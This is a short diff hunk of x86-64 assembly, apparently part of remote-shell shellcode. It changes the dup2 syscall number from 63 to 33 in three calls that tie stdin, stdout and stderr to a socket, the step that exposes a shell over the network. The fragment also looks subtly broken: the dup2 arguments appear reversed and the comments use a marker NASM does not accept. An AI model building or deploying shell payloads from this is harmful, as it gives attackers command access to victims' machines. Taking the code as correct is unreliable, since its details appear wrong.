@@ -150,17 +150,17 @@ _start:
 	syscall
 
 	; 3 dup2() data steams to socket
-	mov rax, 63
+	mov rax, 33
 	mov rdi, 0 // stdin
 	mov rsi, rbx
 	syscall
 
-	mov rax, 63
+	mov rax, 33
 	mov rdi, 1 // stdout
 	mov rsi, rbx
 	syscall
 
-	mov rax, 63
+	mov rax, 33
 	mov rdi, 2 // stderr
 	mov rsi, rbx
 	syscall
